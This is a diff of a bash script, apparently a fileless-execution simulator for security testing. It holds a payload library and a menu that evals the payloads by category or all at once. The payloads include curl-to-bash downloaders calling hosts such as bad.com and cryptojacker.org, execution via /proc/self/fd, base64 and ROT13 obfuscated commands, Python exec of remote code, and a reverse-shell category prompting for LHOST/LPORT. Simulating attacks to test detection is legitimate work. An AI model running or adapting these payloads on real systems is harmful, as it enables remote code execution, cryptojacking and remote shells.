@@ -1,42 +1,31 @@
 #!/usr/bin/env bash
 #
-# fileless-menu.sh  –  colourful file-less demo runner
-# ------------------------------------------------------------------
-#  chmod +x fileless-menu.sh
-#  ./fileless-menu.sh
-#
-#  • No ‘set -u’:  undefined vars will not abort the script.
-#  • LHOST / LPORT* get defaults (127.0.0.1 / 444{1,2,3})
-#    and you can override them interactively.
-# ------------------------------------------------------------------
+# fileless-menu.sh  –  Upwind fileless-execution simulator
+# ------------------------------------------------------------
+# • Runs all payloads per category (1-4) or every payload (5)
+# • Works even if colours are disabled (degrades gracefully)
+# • Prompts for LHOST / LPORTs only once when a payload needs them
+# ------------------------------------------------------------
 
-set -eo pipefail    # stop on real errors, ignore unset vars
+set -eo pipefail         # real errors stop the script
+shopt -s extglob         # needed for pattern matching tricks
+export PS4=''            # no trace clutter if xtrace is enabled
 
-# ── ANSI colours ──────────────────────────────────────────────────
-RESET='\033[0m'; BOLD='\033[1m'
-BLU='\033[1;34m'; CYN='\033[1;36m'
-GRN='\033[1;32m'; YEL='\033[1;33m'
-RED='\033[1;31m'; MAG='\033[1;35m'
+# ── Colour definitions (use ESC-quoted strings) ──────────────
+RESET=$'\e[0m'; BOLD=$'\e[1m'
+BLU=$'\e[1;34m'; CYN=$'\e[1;36m'
+GRN=$'\e[1;32m'; YEL=$'\e[1;33m'
+RED=$'\e[1;31m'; MAG=$'\e[1;35m'
 
 declare -A CAT_COL=(
-  [Downloaders]="$GRN"
   [Encoding]="$YEL"
+  [Downloaders]="$GRN"
   [ReverseShells]="$RED"
   [AdvancedFD]="$MAG"
 )
 
-# ── Command library  (verbatim from your list) ────────────────────
+# ── Payload library (verbatim) ───────────────────────────────
 declare -A categories
-categories[Downloaders]='
-# 1
-curl -s http://example.com/script.sh | bash
-# 2
-exec 3< <(curl -s http://bad.com/payload.sh); bash /proc/self/fd/3
-# 3
-X=$(curl -s http://cryptojacker.org/liorpayload.py); python3 -c "$X"
-# 4
-bash -c "$(curl -s https://raw.githubusercontent.com/liorbm/fileless-execution-demo/refs/heads/main/payload.sh)"
-'
 
 categories[Encoding]='
 # 5
@@ -47,6 +36,17 @@ bash -c "$(curl -s https://raw.githubusercontent.com/liorbm/fileless-execution-d
 bash -c "$(echo ENFUGBYY | tr A-Za-z N-ZA-Mn-za-m | base64 -d)"
 # 8
 exec 8< <(openssl enc -d -base64 <<< L2Jpbi9zaCAtYyBlY2hvIGhlbGxv); bash /proc/self/fd/8
+'
+
+categories[Downloaders]='
+# 1
+curl -s http://example.com/script.sh | bash
+# 2
+exec 3< <(curl -s http://bad.com/payload.sh); bash /proc/self/fd/3
+# 3
+X=$(curl -s http://cryptojacker.org/liorpayload.py); python3 -c "$X"
+# 4
+bash -c "$(curl -s https://raw.githubusercontent.com/liorbm/fileless-execution-demo/refs/heads/main/payload.sh)"
 '
 
 categories[ReverseShells]='
@@ -79,71 +79,81 @@ exec(urllib.request.urlopen("https://raw.githubusercontent.com/liorbm/fileless-e
 PY
 '
 
-# ── Defaults & helper for network variables ───────────────────────
+# ── Defaults & interactive prompt for net vars ───────────────
 LHOST=${LHOST:-127.0.0.1}
 LPORT1=${LPORT1:-4441}
 LPORT2=${LPORT2:-4442}
 LPORT3=${LPORT3:-4443}
 
-ensure_net_vars() {
-  read -rp "LHOST [${LHOST}]: " tmp && [[ $tmp ]] && LHOST=$tmp
-  read -rp "LPORT1 [${LPORT1}]: " tmp && [[ $tmp ]] && LPORT1=$tmp
-  read -rp "LPORT2 [${LPORT2}]: " tmp && [[ $tmp ]] && LPORT2=$tmp
-  read -rp "LPORT3 [${LPORT3}]: " tmp && [[ $tmp ]] && LPORT3=$tmp
+ask_net_vars() {
+  echo -e "${BOLD}${CYN}→ Reverse-shell payload selected. Enter listener details (Enter = keep default).${RESET}"
+  read -rp "  LHOST  [${LHOST}]: " tmp && [[ $tmp ]] && LHOST=$tmp
+  read -rp "  LPORT1 [${LPORT1}]: " tmp && [[ $tmp ]] && LPORT1=$tmp
+  read -rp "  LPORT2 [${LPORT2}]: " tmp && [[ $tmp ]] && LPORT2=$tmp
+  read -rp "  LPORT3 [${LPORT3}]: " tmp && [[ $tmp ]] && LPORT3=$tmp
 }
 
-# ── UI helpers ────────────────────────────────────────────────────
-draw_categories() {
-  echo -e "\n${BOLD}== Choose a category ==${RESET}"
-  local i=0
-  for cat in "${!categories[@]}"; do
-    printf "%s%2d%s) %b%s%b\n" "$BLU" "$((++i))" "$RESET" "${CAT_COL[$cat]}" "$cat" "$RESET"
-  done
-}
-
-draw_commands() {
-  local cat="$1" cmdlines=()
-  while IFS= read -r ln; do [[ $ln ]] && cmdlines+=("$ln"); done <<<"${categories[$cat]}"
-  echo -e "\n${BOLD}== $cat commands ==${RESET}"
-  for ((i=0; i<${#cmdlines[@]}; i+=2)); do
-    num="${cmdlines[i]//\# }"
-    printf "%s%2d%s) %s\n" "$CYN" "$num" "$RESET" "${cmdlines[i+1]}"
-  done
-}
-
-run_cmd() {        # run with nounset off to avoid surprises
-  local cmd="$1"
-  echo -e "\n${BOLD}[ ▶ ]${RESET} $cmd\n"
-  set +u
-  eval "$cmd"
+# ── Execution helpers ─────────────────────────────────────────
+run_block() {     # arg1 = string containing several lines
+  local block="$1"; set +u        # disable nounset just for eval
+  while IFS= read -r line; do
+    [[ $line =~ ^#\  ]] && continue          # skip comment markers
+    [[ $line ]] || continue                  # skip blank lines
+    echo -e "${YEL}[▶] $line${RESET}"
+    eval "$line"
+  done <<< "$block"
   set -u
-  echo -e "\n${GRN}✔ Done.${RESET}  Press Enter…"
-  read -r
 }
 
-# ── Main loop ─────────────────────────────────────────────────────
-while true; do
+execute_category() {               # arg1 = category name
+  local cat="$1"
+  [[ $cat == ReverseShells ]] && ask_net_vars
+  run_block "${categories[$cat]}"
+}
+
+execute_all() {
+  for cat in Encoding Downloaders ReverseShells AdvancedFD; do
+    echo -e "\n${BOLD}${CAT_COL[$cat]}=== $cat ===${RESET}\n"
+    execute_category "$cat"
+  done
+}
+
+# ── Menu drawing ──────────────────────────────────────────────
+draw_banner() {
   clear
-  echo -e "${BOLD}${MAG}*** Fileless-Execution Playground ***${RESET}"
-  draw_categories
-  read -rp $'\nCategory (number, q=quit): ' choice || exit 0
-  [[ $choice =~ ^[Qq]$ ]] && exit
+  if command -v figlet >/dev/null 2>&1; then
+    figlet -f slant Upwind 2>/dev/null | sed "s/^/${MAG}/;s/$/${RESET}/"
+  else
+    echo -e "${MAG}${BOLD}*** Upwind ***${RESET}"
+  fi
+  echo -e "${CYN}fileless execution simulation by Lior Boehm${RESET}\n"
+}
 
-  cat_keys=("${!categories[@]}")
-  sel_cat="${cat_keys[choice-1]}"
-  [[ -z $sel_cat ]] && { echo "Invalid"; sleep 1; continue; }
+draw_menu() {
+  echo -e "${BOLD}== Choose an option ==${RESET}"
+  printf "%s1%s) %bEncoding%b\n"        "$BLU" "$RESET"  "$YEL" "$RESET"
+  printf "%s2%s) %bDownloaders%b\n"     "$BLU" "$RESET"  "$GRN" "$RESET"
+  printf "%s3%s) %bReverseShells%b\n"   "$BLU" "$RESET"  "$RED" "$RESET"
+  printf "%s4%s) %bAdvancedFD%b\n"      "$BLU" "$RESET"  "$MAG" "$RESET"
+  printf "%s5%s) %bALL PAYLOADS%b\n"    "$BLU" "$RESET"  "$CYN" "$RESET"
+  printf "%sq%s) %bQuit%b\n"            "$BLU" "$RESET"  "$BOLD" "$RESET"
+}
 
-  draw_commands "$sel_cat"
-  read -rp $'\nCommand ID (b=back): ' num || exit 0
-  [[ $num =~ ^[Bb]$ ]] && continue
-
-  # grab the command text
-  cmd=$(grep -A1 -E "^# *$num$" <<<"${categories[$sel_cat]}" | tail -n1)
-  [[ -z $cmd ]] && { echo "Invalid"; sleep 1; continue; }
-
-  # prompt for network details if the cmd references them
-  [[ $cmd == *'${LHOST}'* ]] && ensure_net_vars
-
-  # substitute vars, then run
-  run_cmd "$(eval "echo \"$cmd\"")"
+# ── Main loop ────────────────────────────────────────────────
+set +u   # ignore unset in UI logic
+while true; do
+  draw_banner
+  draw_menu
+  read -rp $'\nOption: ' opt || exit
+  case $opt in
+    1) execute_category Encoding;;
+    2) execute_category Downloaders;;
+    3) execute_category ReverseShells;;
+    4) execute_category AdvancedFD;;
+    5) execute_all;;
+    [Qq]) exit 0;;
+    *) echo "Invalid option"; sleep 1;;
+  esac
+  echo -e "\n${GRN}✓ Payload(s) finished. Press Enter to return to the main menu…${RESET}"
+  read -r
 done
